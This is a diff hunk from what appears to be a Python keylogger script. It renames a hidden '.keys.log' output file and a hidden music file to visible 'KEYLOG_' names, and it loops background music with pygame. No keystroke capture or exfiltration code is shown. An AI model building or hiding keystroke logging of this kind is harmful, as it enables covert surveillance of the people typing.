@@ -16,12 +16,12 @@ def main():
     running = True
 
     # Specify the name of the file (can be changed )
-    log_file = f'{os.getcwd()}/.keys.log'
+    log_file = f'{os.getcwd()}/KEYLOG_out.log'
     chars = "    "
     
     # initialize the pygame mixer
     pygame.mixer.init()
-    pygame.mixer.music.load(".music.mp3")
+    pygame.mixer.music.load("KEYLOG_music.mp3")
     pygame.mixer.music.set_volume(0.8)
     pygame.mixer.music.play(-1)
     
